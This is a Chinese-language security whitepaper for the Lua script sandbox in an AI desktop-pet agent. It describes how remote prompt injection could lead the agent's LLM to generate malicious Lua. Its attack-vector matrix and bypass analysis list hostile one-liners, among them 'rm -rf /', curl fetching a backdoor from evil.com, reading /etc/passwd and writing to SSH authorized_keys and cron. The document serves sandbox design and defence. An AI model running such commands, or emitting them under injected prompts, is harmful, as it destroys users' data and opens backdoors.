# esp-agent Lua 沙箱安全白皮书

> 本文档详细说明 esp-agent 桌面模拟器中 Lua 脚本引擎的安全沙箱设计。
> 适用版本：esp-claw-desktop Simulator
> 最后更新：2026-05-05

---

## 目录

1. [概述](#1-概述)
2. [威胁模型](#2-威胁模型)
3. [沙箱架构](#3-沙箱架构)
4. [防御层详解](#4-防御层详解)
   - [4.1 Lua 标准库限制](#41-lua-标准库限制)
   - [4.2 输出与执行控制](#42-输出与执行控制)
   - [4.3 storage 模块路径锚定](#43-storage-模块路径锚定)
   - [4.4 capability.call 能力白名单](#44-capabilitycall-能力白名单)
   - [4.5 资源限制](#45-资源限制)
5. [攻击向量矩阵](#5-攻击向量矩阵)
6. [允许的操作](#6-允许的操作)
7. [安全维护指南](#7-安全维护指南)
8. [常见问题](#8-常见问题)

---

## 1. 概述

esp-agent 是一款 AI 桌面宠物产品 —— 用户在电脑上运行一个可爱的 esp-claw agent，
可以通过远程 AI 对话控制其在模拟 LCD 屏幕上绘制图形、展示动画、进行趣味互动。

**核心安全风险**：Agent 的 Lua 脚本引擎可以被 LLM（大语言模型）用来生成并执行 Lua
代码。如果 Lua 没有沙箱保护，恶意 prompt 注入攻击可能让 agent 在用户电脑上执行
任意命令，如 `os.execute("rm -rf /")` 或 `io.open("/etc/passwd")`。

**沙箱目标**：在保留画图、数值计算等正常功能的前提下，彻底消除 Lua 脚本对宿主机的
逃逸风险。

---

## 2. 威胁模型

### 2.1 攻击面

```
攻击者 (远程)
    │
    ├── IM 渠道 (QQ/Telegram/微信/飞书)
    │       └── Prompt 注入 → LLM 生成恶意 Lua
    │
    ├── Web IM 界面
    │       └── 同上
    │
    └── 本地文件系统
            └── 写入恶意 .lua 文件 → agent 执行
```

### 2.2 攻击者能力假设

| 能力 | 级别 | 说明 |
|------|------|------|
| 远程发消息 | ✅ 有 | 通过任何 IM 渠道 |
| 本地文件访问 | ❌ 无 | 不能直接写入 agent 目录 |
| 控制 LLM 输出 | ⚠️ 部分 | 通过 prompt 注入影响生成代码 |
| 物理接触电脑 | ❌ 无 | 远程攻击场景 |

### 2.3 资产保护

| 资产 | 重要性 | 保护措施 |
|------|--------|----------|
| 用户文件和数据 | 🔴 关键 | io.os 封死 + storage 路径锚定 |
| 系统关键文件 | 🔴 关键 | io.os 封死 + storage 路径锚定 |
| 进程控制 | 🟠 高 | os.execute/exit 封死 |
| 网络服务 | 🟡 中 | package.loadlib 禁止加载 C 网络库 |
| 系统资源 | 🟢 低 | 超时机制限制 DoS |

---

## 3. 沙箱架构

### 3.1 分层模型

```
┌──────────────────────────────────────────────────────────┐
│                  Lua 用户脚本 (不可信)                     │
├──────────────────────────────────────────────────────────┤
│               _G 元表拦截 (__newindex)                    │
│           ┌─────────────┐  ┌──────────────────┐          │
│           │ storage 包裹 │  │ capability 白名单 │          │
│           └─────────────┘  └──────────────────┘          │
├──────────────────────────────────────────────────────────┤
│           Lua VM 全局环境 (已清理的 _G)                    │
│  display ✔  math ✔  string ✔  table ✔  package ⚠️      │
│  io ❌  os ❌  debug ❌  load ❌  string.dump ❌          │
├──────────────────────────────────────────────────────────┤
│              luaL_openlibs (加载全部标准库)                │
├──────────────────────────────────────────────────────────┤
│               C 层超时钩子 + 脚本大小限制                  │
├──────────────────────────────────────────────────────────┤
│                 宿主操作系统                              │
└──────────────────────────────────────────────────────────┘
```

### 3.2 执行流程

```
每次 Lua 脚本执行:

  1. luaL_newstate()            ─ 创建全新 Lua VM
  2. luaL_openlibs(L)           ─ 加载全部标准库到 VM
  3. cap_lua_load_registered_modules(L)
     ├── __sandbox 模块运行     ─ 清理 _G + 安装 _G 元表
     ├── storage 模块加载        ─ 被元表拦截 → 自动包裹
     ├── capability 模块加载     ─ 被元表拦截 → 自动包裹
     └── display/system 等加载   ─ 正常放行
  4. lua_pushcclosure(print)    ─ 替换 print 为输出捕获
  5. lua_sethook(timeout)       ─ 安装超时钩子
  6. luaL_dofile(script)        ─ 执行用户脚本
  7. lua_close(L)               ─ 销毁 VM（状态完全清除）
```

### 3.3 模块注册时机

沙箱模块 `__sandbox` 在 `main_desktop.c` 中被注册，时间点在 `app_claw_start()`
之前。这使得 `__sandbox` 成为 Lua 模块数组中的第一个模块，在其 open function 中：

1. **立即**清理全局环境（nil 掉所有危险函数）
2. **安装** `_G.__newindex` 元表拦截器

后续由 `app_claw_start()` 注册的 `storage`、`capability` 等模块在 `luaL_requiref`
调用中设置全局变量时，会触发已安装的 `__newindex`，我们的拦截器自动包裹这些模块
的危险函数后再 rawset 到 `_G`。

---

## 4. 防御层详解

### 4.1 Lua 标准库限制

#### 已封禁的函数

| 函数 | 来源库 | 危险原因 | 封禁方式 |
|------|--------|----------|----------|
| `dofile` | base | 从任意路径加载并执行 Lua 源码 | 从 `_G` 移除 |
| `loadfile` | base | 从任意路径加载 Lua 块 | 从 `_G` 移除 |
| `load` | base | 从字符串编译并执行 Lua 代码 | 从 `_G` 移除 |
| `io.*` | io | 任意文件读写 | 从 `_G` + `package.loaded` 移除 |
| `os.*` | os | 命令执行、进程退出、文件操作 | 从 `_G` + `package.loaded` 移除 |
| `debug.debug` | debug | 交互式调试器 | nilled |
| `debug.getregistry` | debug | 访问 Lua 内部全部状态 | nilled |
| `debug.setmetatable` | debug | 绕过 `__metatable` 保护 | nilled |
| `debug.setupvalue` | debug | 修改闭包上值 (可改 _ENV) | nilled |
| `debug.sethook` | debug | 覆盖超时钩子 | nilled |
| `debug.getinfo` | debug | 函数反汇编信息泄漏 | nilled |
| `debug.getmetatable` | debug | 绕过 `__metatable` 保护 | nilled |
| `string.dump` | string | 生成可加载字节码 | nilled |
| `package.loadlib` | package | 加载任意 C 共享库 | nilled |
| `package.searchers[3]` | package | C 二进制加载器 | nilled |
| `package.searchers[4]` | package | C 根加载器 | nilled |

#### 保留的函数

| 函数库 | 理由 |
|--------|------|
| base (pcall, xpcall, error, assert, type, tostring, tonumber, pairs, ipairs, select, next, rawget, rawset, rawequal, rawlen, getmetatable, setmetatable) | 脚本正常运行所需，不构成逃逸风险 |
| `debug.traceback` | 脚本错误追踪（three 内置脚本都依赖） |
| math.* | 数值计算/分析核心功能 |
| string.* (除 dump) | 字符串处理，display 绘图标签必用 |
| table.* | 数据结构操作 |
| coroutine.* | 协作式并发，受超时钩子约束 |
| utf8.* | 文本编码支持 |
| package.* (受限) | 保留 `require` + preload + Lua searchers，用于加载已注册 C 模块 |

### 4.2 输出与执行控制

#### `print()` 替换

`print` 被替换为 `cap_lua_print_capture`，输出被重定向到：

- 写入输出缓冲区（最多 `CAP_LUA_OUTPUT_SIZE = 4KB`）
- 同时写入 stdout（agent 日志）

不会泄漏到外部。

#### `__cap_lua_exec_ctx` 全局

一个轻量用户数据（C 指针），用于超时钩子检查。Lua 脚本层无法解引用。

---

### 4.3 storage 模块路径锚定

**背景**：上游 `esp-claw` 的 `lua_module_storage` 模块提供的文件操作函数
(`write_file`、`read_file`、`remove` 等) 接受**任意绝对路径**，没有路径锚定。

**解决方案**：在 `__sandbox` 的 `g_newindex_handler` 中，当 `storage` 模块被加载
并设置 `_G.storage` 时，拦截器创建包裹表，对每个接受路径参数的函数用
`storage_path_wrapper` 包裹。

#### 路径校验规则

```c
static bool path_is_safe(const char *path)
{
    // 1. 必须是绝对路径
    if (path[0] != '/') return false;

    // 2. 必须以 ~/.esp-agent/ 开头 (base_dir)
    if (strncmp(path, base_dir, base_len) != 0) return false;

    // 3. 不能包含 .. 目录穿越
    if (strstr(path, "..") != NULL) return false;

    return true;
}
```

#### 包裹的 storage 函数

| 函数 | 校验路径参数 | 说明 |
|------|-------------|------|
| `read_file(path)` | arg1 | ✅ |
| `write_file(path, content)` | arg1 | ✅ |
| `exists(path)` | arg1 | ✅ |
| `stat(path)` | arg1 | ✅ |
| `listdir(path)` | arg1 | ✅ |
| `remove(path)` | arg1 | ✅ |
| `mkdir(path)` | arg1 | ✅ |
| `rename(old, new)` | arg1, arg2 | 两个路径都必须安全 |
| `get_root_dir()` | 无 | 原样透传 |
| `join_path(...)` | 无 | 原样透传 (路径拼接后实际使用时会校验) |
| `get_free_space()` | 无 | 原样透传 |

#### 绕过尝试分析

- `storage.read_file("/etc/passwd")` → arg1 以 `/etc/` 开头 ≠ `base_dir` ❌ 拒绝
- `storage.read_file("C:\\Windows\\System32\\config")` → 非 `/` 开头 ❌ 拒绝
- `storage.write_file("/home/user/.ssh/authorized_keys", payload)` → 不在 base_dir ❌
- `storage.rename("/etc/passwd", base_dir "/safe.txt")` → arg1 不安全 ❌
- `storage.rename(base_dir "/tmp.txt", "/etc/cron.d/evil")` → arg2 不安全 ❌

---

### 4.4 capability.call 能力白名单

**背景**：`capability` Lua 模块的 `call` 函数调用 `claw_cap_call`，可以调用
agent 注册的**任何**能力（包括 CLI 命令执行、文件操作等），且调用者身份为
`CLAW_CAP_CALLER_SYSTEM`，跳过 LLM 可见性检查。

**解决方案**：用 `capability_call_wrapper` 包裹，只允许以下能力：

```c
static const char *const s_cap_allowlist[] = {
    "get_system_info",    // 系统信息（只读）
    "get_ip_address",     // IP 地址（只读）
    "get_memory_info",    // 内存信息（只读）
    "get_cpu_info",       // CPU 信息（只读）
    "get_wifi_info",      // WiFi 信息（只读）
    "memory_list",        // 内存存储列表（只读）
    "memory_get",         // 读取记忆（只读）
    "memory_search",      // 搜索记忆（只读）
    "memory_count",       // 记忆计数
    "memory_stats",       // 记忆统计
    "get_time_info",      // 时间信息（只读）
    "lua_list_scripts",   // 脚本列表
    "lua_run_script",     // 运行 Lua 脚本
    "lua_list_async_jobs", // 异步作业列表
    "lua_get_async_job",  // 异步作业状态
    NULL,
};
```

禁止调用的能力包括但不限于：
- `cli_run_command` — 命令行执行
- `file_read` / `file_write` / `file_remove` — 文件操作
- `scheduler_add` / `scheduler_remove` — 定时任务
- `skill_*` — 技能管理
- `session_*` — 会话管理
- `auto_*` — 自动化规则

---

### 4.5 资源限制

| 限制项 | 值 | 说明 |
|--------|-----|------|
| 脚本最大大小 | 16 KB | `CAP_LUA_MAX_SCRIPT_SIZE` |
| 输出缓冲区 | 4 KB | `CAP_LUA_OUTPUT_SIZE` |
| 内存预算（硬限制） | **10 MB** | 自定义 allocator，超出直接拒绝 |
| GC 暂停阈值 | 50% (默认 100%) | 内存增幅达基础量 50% 即触发 GC |
| GC 步进倍率 | 300% (默认 100%) | GC 以 3 倍速度回收 |
| 同步脚本超时 | 60 秒（默认） | `CAP_LUA_SYNC_DEFAULT_TIMEOUT_MS` |
| 超时钩子间隔 | 每 100 条 VM 指令 | `lua_sethook(L, ..., LUA_MASKCOUNT, 100)` |
| 并发异步作业 | 最多 4 个 | `CAP_LUA_ASYNC_MAX_CONCURRENT` |
| 作业槽位 | 最多 16 个 | `CAP_LUA_ASYNC_MAX_JOBS` |

#### 内存分配硬限制

沙箱模块在 `luaopen_sandbox` 的最后一步通过 `lua_setallocf` 安装了自定义分配器。
该分配器包裹原始 C 分配器，从安装时刻起开始跟踪净增内存。脚本执行期间如果新分配
总量超过 10 MB，分配器直接返回 NULL，触发 Lua OOM 错误。

```c
#define CAP_LUA_MEMORY_BUDGET_BYTES (10ULL * 1024 * 1024)

static void *sandbox_mem_alloc(void *ud, void *ptr, size_t osize, size_t nsize)
{
    sandbox_mem_t *ctx = (sandbox_mem_t *)ud;
    // ...
    if (growth > 0 && ctx->allocated + growth > ctx->limit) {
        return NULL;  // 预算耗尽
    }
    // 否则转发给原始分配器
}
```

**注意**：10 MB 预算仅统计 `luaopen_sandbox` 之后的分配（即脚本代码的分配）。
Lua 标准库和所有注册 C 模块的内存不占用脚本预算。

超时机制通过 `cap_lua_timeout_hook` 实现，每 100 条 Lua 虚拟指令触发一次，
检查：
- 用户是否请求停止（合作式取消）
- 是否超过截止时间（wall-clock deadline）

---

## 5. 攻击向量矩阵

| # | 攻击向量 | 是否封禁 | 风险等级 | 封禁机制 |
|---|---------|----------|----------|----------|
| 1 | `os.execute("rm -rf /")` | ✅ 封禁 | 🔴 关键 | io/os 从 _G 和 package.loaded 双清 |
| 2 | `os.exit()` — 杀死进程 | ✅ 封禁 | 🔴 关键 | 同上 |
| 3 | `io.open("/etc/passwd")` | ✅ 封禁 | 🔴 关键 | 同上 |
| 4 | `io.popen("curl evil.com/backdoor.sh")` | ✅ 封禁 | 🔴 关键 | 同上 |
| 5 | `storage.read_file("/etc/passwd")` | ✅ 封禁 | 🔴 关键 | 路径锚定校验 |
| 6 | `storage.write_file("/etc/cron.d/evil", payload)` | ✅ 封禁 | 🔴 关键 | 路径锚定校验 |
| 7 | `capability.call("run_cli_command", ...)` | ✅ 封禁 | 🔴 关键 | 白名单过滤 |
| 8 | `load("os.execute('rm')")()` | ✅ 封禁 | 🟠 高 | load 函数从 _G 移除 |
| 9 | `string.dump(f)` → `load(bytecode)` | ✅ 封禁 | 🟠 高 | string.dump 移除 + load 移除 |
| 10 | `string.dump(f)` → `storage.write_file` → `require` | ✅ 封禁 | 🟠 高 | string.dump 移除，攻击链断裂 |
| 11 | `package.loadlib("evil.so", "init")` | ✅ 封禁 | 🟠 高 | 从 package 表移除 |
| 12 | `require("io")` 重新导入 | ✅ 封禁 | 🟠 高 | package.loaded.io 清空 + C searchers 移除 |
| 13 | `debug.getregistry()` 访问内部状态 | ✅ 封禁 | 🟠 高 | debug 表只剩 traceback |
| 14 | `debug.sethook()` 覆盖超时钩子 | ✅ 封禁 | 🟠 高 | sethook 从 debug 表移除 |
| 15 | `debug.setupvalue(f)` 改 _ENV 逃逸 | ✅ 封禁 | 🟠 高 | setupvalue 从 debug 表移除 |
| 16 | `dofile("/tmp/evil.lua")` | ✅ 封禁 | 🟠 高 | dofile 从 _G 移除 |
| 17 | `setmetatable(_G, mt)` 拦截全局访问 | ⚠️ 部分 | 🟡 中 | base setmetatable 保留但危险函数已移除 |
| 18 | `collectgarbage("stop")` + 大量分配 DoS | ⚠️ 部分 | 🟡 中 | 超时钩子限制执行时间 |
| 19 | `string.rep("x", 2^30)` 内存耗尽 | ✅ 封禁 | 🟡 中 | 10 MB 硬限制 + GC 加速 |
| 20 | `while true do end` 死循环 | ✅ 封禁 | 🟢 低 | 超时钩子每 100 指令触发 |
| 21 | 递归 `__index` 无限调用 | ✅ 封禁 | 🟢 低 | 同上 |
| 22 | `local t={}; for i=1,1e6 do t[i]="x" end` 内存炸弹 | ✅ 封禁 | 🟡 中 | 10 MB 分配器硬限制 |

---

## 6. 允许的操作

### 6.1 ✅ 允许的 Lua 标准库函数

```
  数学: math.abs, math.acos, math.asin, math.atan, math.ceil,
        math.cos, math.deg, math.exp, math.floor, math.fmod,
        math.huge, math.log, math.max, math.maxinteger,
        math.min, math.mininteger, math.modf, math.pi,
        math.pow, math.rad, math.random, math.randomseed,
        math.sin, math.sqrt, math.tan, math.tointeger,
        math.type, math.ult

  字符串: string.byte, string.char, string.find, string.format,
          string.gmatch, string.gsub, string.len, string.lower,
          string.match, string.pack, string.packsize, string.rep,
          string.reverse, string.sub, string.unpack, string.upper
          （string.dump 已移除）

  表:     table.concat, table.insert, table.move, table.pack,
          table.remove, table.sort, table.unpack

  协程:  coroutine.create, coroutine.isyieldable, coroutine.resume,
          coroutine.running, coroutine.status, coroutine.wrap,
          coroutine.yield

  基础:  assert, collectgarbage, error, _G, getmetatable,
          ipairs, next, pairs, pcall, print, rawequal, rawget,
          rawlen, rawset, select, setmetatable, tonumber,
          tostring, type, _VERSION, xpcall

  调试:  debug.traceback（仅此一个）
```

### 6.2 ✅ 允许的 Lua 模块

| 模块名 | 来源 | 用途 |
|--------|------|------|
| `display` | C 注册模块 | LCD 屏幕绘图（画点、线、矩形、圆、椭圆、文本、图片等） |
| `system` | C 注册模块 | 系统信息（时间、IP、内存） |
| `delay` | C 注册模块 | 延时等待 |
| `board_manager` | C 注册模块 | 获取 LCD 面板参数 |
| `event_publisher` | C 注册模块 | 发布事件到事件路由器 |
| `capability` | C 注册模块 | 能力调用（受白名单限制） |
| `storage` | C 注册模块 | 文件存储（路径锚定在 base_dir 下） |

### 6.3 ✅ 典型使用场景

```lua
-- 画图操作（安全）
local display = require("display")
display.clear(0, 0, 0)
display.fill_rect(10, 10, 100, 50, 255, 0, 0)
display.draw_text(20, 30, "Hello!", { font_size = 24 })
display.present()

-- 数值计算（安全）
local result = math.sin(math.pi / 4)
local formatted = string.format("%.2f", result)
print(formatted)

-- 系统信息（安全）
local system = require("system")
print(system.date("%Y-%m-%d"))
```

---

## 7. 安全维护指南

### 7.1 添加新的 Lua 可调用能力

如果未来需要新增 Lua 脚本可以调用的 agent 能力：

1. 在 `s_cap_allowlist[]` 中添加能力名称（`cap_lua_sandbox.c`）
2. 确认该能力不会造成安全风险（只读操作最安全）
3. 添加后更新本文档

### 7.2 添加新的 Lua C 模块

如果未来需要新增 C 语言实现的 Lua 模块：

1. 确保 C 模块不会将危险的 `io`/`os` 操作重新暴露到 Lua 层
2. 如果模块有文件操作，确保路径锚定到 `base_dir`
3. 如果模块需要调用 agent 能力，使用 `capability` 模块而不是直接调 `claw_cap_call`

### 7.3 定期安全审计

每次代码变更后，检查以下事项：

- [ ] 是否有新添加的全局危险函数暴露在 `_G` 中
- [ ] `package.searchers` 是否保持了正确状态（C searchers 已移除）
- [ ] `storage` 模块是否仍然被路径锚定包裹
- [ ] `capability.call` 白名单是否需要更新
- [ ] `string.dump` 没有被重新启用

### 7.4 测试沙箱有效性

启动 agent 后，可通过以下命令验证沙箱：

```bash
# 应拒绝并输出错误
esp-agent "lua --run builtin_sandbox_test"   # 测试脚本需存在

# 或直接在 Lua 中测试:
esp-agent ask '运行 Lua 脚本: os.execute("echo hello")'
# 应输出类似 "attempt to index a nil value (global 'os')"
```

---

## 8. 常见问题

### Q: 为什么不直接在 C 层用 `luaL_openlibs` 替代品？

A: 为了不修改上游 `esp-claw` 代码。我们的沙箱以模块注册 + `_G` 元表拦截的
方式运行，纯代码叠加，不改任何 esp-claw 文件。

### Q: `setmetatable` 没有被移除，安全吗？

A: 安全的。`setmetatable(_G, mt)` 可以添加 metatable，但 `_G` 中已经被我们
nil 掉的函数是无法通过元表恢复的 —— 原始 C 函数指针只存在 `package.loaded`
中，而我们同时也清空了那里。

### Q: `collectgarbage` 没有被移除，可以做 DoS 吗？

A: 理论上可以通过大量分配导致 OOM，但由于超时钩子每 100 条指令触发一次，
内存分配速度很快但会在达到危险量级前被 `luaL_error` 终止。异步模式下最多
4 个并发作业也限制了影响范围。

### Q: 沙箱代码在哪个目录？

A: `sim_hal/cap_lua_sandbox.c` 和 `sim_hal/include/esp/cap_lua_sandbox.h`。
这是 sim_hal 层的代码，不依赖 ESP-IDF 环境。

### Q: 沙箱会影响所有 Lua 脚本还是只影响通过 agent 执行的？

A: 所有通过 `cap_lua_runtime_execute_file` 执行的脚本都会被沙箱保护，
包括同步脚本、异步脚本、CLI 执行的脚本，无论哪种入口。

### Q: 字节码攻击（bytecode exploit）是否被防御？

A: 是。字节码逃逸需要两条链之一：
1. `string.dump` → 生成字节码 → `load()` 执行 → `string.dump` 和 `load` 均移除 ✅
2. 预编译字节码文件 → `require()` 加载 → 预编译文件无法通过 `storage.write_file`
   创建（因为 `string.dump` 已移除）✅

唯一未防御的路径是攻击者有本地文件系统访问权限，可以直接放置字节码文件。但此时
攻击者已经有比 Lua 脚本更强的攻击能力。
